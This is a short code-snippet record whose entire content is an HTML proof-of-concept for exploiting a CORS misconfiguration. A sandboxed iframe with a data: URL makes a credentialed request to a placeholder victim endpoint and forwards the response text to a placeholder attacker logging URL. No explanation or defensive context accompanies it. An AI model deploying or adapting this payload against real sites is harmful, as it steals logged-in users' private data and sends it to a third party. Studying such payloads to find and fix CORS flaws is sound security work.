---
id: 6cd148f7-a0cb-48e4-9145-02f400aa910a
type: code
language: HTML
verified: false
created_at: '2023-04-06T03:55:54.608069+00:00'
updated_at: '2023-04-06T03:55:54.611533+00:00'
---

# Code Snippet 6cd148f7

**Language**: HTML

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```
